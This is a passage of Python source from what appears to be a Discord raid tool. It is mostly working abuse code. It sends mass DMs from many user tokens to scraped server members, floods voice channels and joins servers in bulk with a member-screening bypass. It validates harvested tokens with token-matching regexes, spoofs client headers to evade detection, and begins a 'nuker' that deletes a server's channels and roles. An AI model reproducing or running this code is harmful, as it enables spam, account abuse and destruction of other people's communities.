            os.startfile(os.getcwd() + '/utilities/other/TL/source.exe')
    os.system('cls')


    if choice == '19':	
        os.system('cls')
        Spinner()
        os.system('cls')
        message = input("\n[\x1B[35m>\x1B[35m\x1B[37m] \x1B[37mMessage: ")
        amount = int(input("[\x1B[35m>\x1B[35m\x1B[37m] \x1B[37mMessage Amount: "))
        delay = float(input('[\x1B[35m?\x1B[35m\x1B[37m] \x1B[37mDelay: '))

        print(f"{Fore.LIGHTMAGENTA_EX}10 Seconds to Typing Spam{Fore.RESET}")

        for seconds in range(10, 0, -1):
            print(seconds)
            time.sleep(1)
            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Spamming')

        for i in range(0, amount):
            if message != "":
                pyautogui.typewrite(message)
                pyautogui.press("enter")
            else:
                pyautogui.hotkey("ctrl", "v")
                pyautogui.press("enter")

            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {message} Sent')
            time.sleep(delay)

        print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done\n")

        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == '16':
        os.system('cls')
        Spinner()
        os.system('cls')
        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        for token in tokens:
            bottuk = discord.Client(status=discord.Status.offline)
            asc.create_task(bottuk.start(token, bot=False))
            tuk.append(bottuk)

        threading.Thread(target=asc.run_forever).start()

        time.sleep(1)

        print(f'\n{Fore.RED}[{Fore.RESET}>{Fore.RED}]{Fore.RESET} Make Sure Your Tokens Are Email Verified Before Using VC Spammer!')
        vcc = int(input('\n[\x1b[95m>\x1b[95m\x1B[37m] VC Channel ID: '))
        voc = []
        for i in tuk:
            channel = i.get_channel(vcc)
            voc.append(channel)
        for channel in voc:
            asc.create_task(channel.connect())
            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '6':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(
            f'{Fore.LIGHTRED_EX}[!] Warning{Fore.RESET} Make Sure You Account is fully Verified Before Using this Command!')
        time.sleep(2)
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Account DmSpammer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Token DmSpammer')
        choic = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ')

        server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')

        if choic == '1':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            print(f'{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} {Fore.LIGHTGREEN_EX}Scraping Members Now...{Fore.RESET}')
            time.sleep(2)

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            file2 = open("tokens.txt", "r")
            Counter2 = 0

            Content2 = file2.read()
            CoList2 = Content2.split("\n")

            for i in CoList2:
                if i:
                    Counter2 += 1

            time.sleep(2)

            print(f'Scraped {Counter} Members!')

            amountt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))
            realamountt = int(amountt / Counter2)

            tokens = open("tokens.txt", "r").read().splitlines()
            message = input('[\x1b[95m>\x1b[95m\x1B[37m] DM Message: ')

            def dmserver_spam():
                opened_dms = 0
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("utilities/QR/massdm_IDs.txt", "r") as file:
                                allText = file.read()
                                words = list(map(str, allText.split()))
                                idd = random.choice(words)

                            header = mainHeader(token)
                            header2 = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                            payload = {'recipient_id': idd}
                            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header2,
                                               json=payload)

                            payload = {"content": message, "tts": False}
                            j = json.loads(r1.content)

                            r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                               headers=header, json=payload)

                            if r2.status_code == 429:
                                ratelimit = json.loads(r2.content)
                                print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            if r1.status_code == 429:
                                ratelimit = json.loads(r1.content)
                                print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            elif r2.status_code == 200:
                                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Sent DM to: {idd}!")

                            opened_dms += 1

                except:
                    print(f'{Fore.LIGHTRED_EX}{Fore.LIGHTMAGENTA_EX}[>]{Fore.RESET} Token is Locked...{Fore.RESET}')

            dmserver_spam()


        elif choic == '2':
            tokens = input('[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
            messaage = input('[\x1b[95m>\x1b[95m\x1B[37m] Message: ')

            bot = discum.Client(token=tokens)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            time.sleep(2)

            print(f'[\x1b[95m>\x1b[95m\x1B[37m] There Are {Counter} Members!')
            amountt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))

            def dmspamre():
                try:
                    for i in range(amountt):
                        with open("utilities/QR/massdm_IDs.txt", "r") as file:
                            allText = file.read()
                            words = list(map(str, allText.split()))
                            idd = random.choice(words)

                        header = mainHeader(tokens)

                        headers = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": tokens,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                        payload = {'recipient_id': idd}
                        r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers,
                                           json=payload)

                        payload = {"content": messaage, "tts": False}
                        j = json.loads(r1.content)

                        r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                           headers=header, json=payload)

                        if r2.status_code == 429:
                            ratelimit = json.loads(r2.content)
                            print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        if r1.status_code == 429:
                            ratelimit = json.loads(r1.content)
                            print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                                  str(float(ratelimit['retry_after'])) + " seconds")
                            time.sleep(float(ratelimit['retry_after']))

                        elif r2.status_code == 200:
                            print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Sent DM to: {idd}!")
                        continue

                except:
                    print(f'{Fore.LIGHTRED_EX}[>]{Fore.RESET} Token is Locked...')
                    dmspamre()

            dmspamre()


    if choice == '18':
        os.system('cls')
        Spinner()
        os.system('cls')
        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'[\x1b[95m1\x1b[95m\x1B[37m] About Changer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Activity Status Changer')
        changg = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ')
        if changg == '1':

            def abouttt(token, abbb):
                try:
                    headers = secondHeader(token)
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')
                    else:
                        print(
                            f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Error...")

                except:
                    print('Error...')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input('About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == '2':
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('Activity Status: ')
            for token in tokens:
                threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(1)

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '1':
        os.system('cls')
        Spinner()
        os.system('cls')
        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch

        tokens = open("tokens.txt", "r").read().splitlines()

        def join(invite, token):
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            rrr = requests.post("https://discord.com/api/v9/invites/" + invite, headers=headers)
            if rrr.status_code == 204 or 200:
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')
            else:
                print('[!] Error...')

        print(f"""\n{Fore.LIGHTRED_EX}[!]{Fore.RESET} Make Sure Your Tokens Are In Token.txt For Joiner To Work!\n""")
        invite = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Discord Server Invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input(f'[\x1b[95m?\x1b[95m\x1B[37m] Delay: '))

        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()

        time.sleep(1)

        b = input('[\x1b[95m>\x1b[95m\x1B[37m] Do you want to bypass member screening y/n?: ')

        if b == '.':
            def bpss(invite_code, serverId, token):
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US',
                    'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    'DNT': '1',
                    'origin': 'https://discord.com',
                    'TE': 'Trailers',
                    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                    'authorization': token,
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
                bpsur = f"https://discord.com/api/v9/guilds/{serverId}/member-verification?with_guild=false&invite_code=" + invite_code
                r1 = requests.get(bpsur, headers=headers).json()
                data = {}
                data['version'] = r1['version']
                data['form_fields'] = r1['form_fields']
                data['form_fields'][0]['response'] = True
                req = f"https://discord.com/api/v9/guilds/{str(serverId)}/requests/@me"
                requests.put(req, headers=headers, json=data)

            tokens = open('tokens.txt', 'r').read().splitlines()
            for token in tokens:
                threading.Thread(target=bpss, args=(invite, serverId, token)).start()

        elif b == 'n':
            pass

        print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()


    if choice == '2':
        os.system('cls')
        Spinner()
        os.system('cls')
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m]Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '3':
        os.system('cls')
        Spinner()
        os.system('cls')
        def filter_tokens(unfiltered):
            tokens = []
            for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token not in tokens:
                            tokens.append(token)

            return tokens

        def checker(token):
            response = get(f'https://discordapp.com/api/v9/users/@me/library',
                           headers={'Authorization': token})
            if "[\x1b[95m>\x1b[95m\x1B[37m] You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True

        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        filtered = filter_tokens(tokens)
                        filtr = len(filtered)
                        for token in filtered:
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Valid | {token}')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Invalid | {token}')
                    if len(checked) > 0:
                        save = input(f' \n{len(checked)} Valid\n\nDo You Want to Save Only Valid Tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Tokens Saved to {name}.txt File!')
                except:
                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Error, Cant Open tokens.txt File...')

        start = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter To Start: ')
        start = manager()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '4':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'[\x1b[95m1\x1b[95m\x1B[37m] Online')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Do Not Disturb')
        print(f'[\x1b[95m3\x1b[95m\x1B[37m] Idle')
        onlinr = int(input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: '))

        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        asc = asyncio.new_event_loop()
        asyncio.set_event_loop(asc)

        if onlinr == 1:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.online)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')
        if onlinr == 2:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.do_not_disturb)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')
        if onlinr == 3:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.idle)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')

        threading.Thread(target=asc.run_forever).start()

        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '12':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')

        house = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")

        def hype(token):
            headers = mainHeader(token)

            if house == "1":
                housefinal = '1'

            if house == "2":
                housefinal = '2'

            if house == "3":
                housefinal = '3'

            if house == '4':
                housefinal = None

            if house == '1' or '2' or '3':
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Done')
                else:
                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Failed')

            if house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
                else:
                    pass

            else:
                pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=hype(token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()


    if choice == '14':
        os.system('cls')
        Spinner()
        os.system('cls')
        def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Nickname Changed ')
            if r.status_code != 200:
                print(f'{Fore.LIGHTRED_EX}[!] Cant Change Nickname... {Fore.RESET}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ")
        nick = input("[\x1b[95m>\x1b[95m\x1B[37m] Nickname: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '21':
        os.system('cls')
        Spinner()
        os.system('cls')
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json'
            }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, data=data)
            print('Done')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Status: ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()


    if choice == 17:
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''{Fore.WHITE}MassReport Has Been Patched Meaning It Doesnt Work Anymore...{Fore.RESET}''')

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()


    if choice == '8':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Account Server Nuker')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Bot Server Nuker')

        choicee1 = input('\n[\x1b[95m>>>\x1b[95m\x1B[37m] ')

        if choicee1 == '1':
            token = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
            print(f'[\x1b[95m1\x1b[95m\x1B[37m] Nuker')
            print(f'[\x1b[95m2\x1b[95m\x1B[37m] MassBan/MassKick')
            choicr = input('[\x1b[95m>\x1b[95m\x1B[37m] ')


            if choicr == '1':
                server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')


                intents = discord.Intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET}Deleted Channel: {channel}")
                                    break
                                else:
                                    break

                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
